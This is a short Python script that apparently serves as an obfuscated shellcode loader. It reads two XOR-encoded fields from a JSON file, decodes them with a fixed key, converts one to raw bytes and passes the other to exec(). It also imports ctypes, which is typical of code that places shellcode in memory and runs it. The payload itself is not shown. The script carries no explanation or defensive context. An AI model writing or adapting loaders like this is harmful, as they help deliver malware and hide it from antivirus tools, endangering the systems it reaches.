
#coding:utf-8
import json
import DoXor
import ctypes
with open('1.json', 'r') as f:
    text = f.read()
    jsoncode = json.loads(text)
    code = jsoncode['code']
    load = jsoncode['load']
code = DoXor.XorDecode(code,"aaaaaaaaaa")
code = bytes.fromhex(code)
exec (DoXor.XorDecode(load,"aaaaaaaaaa"))
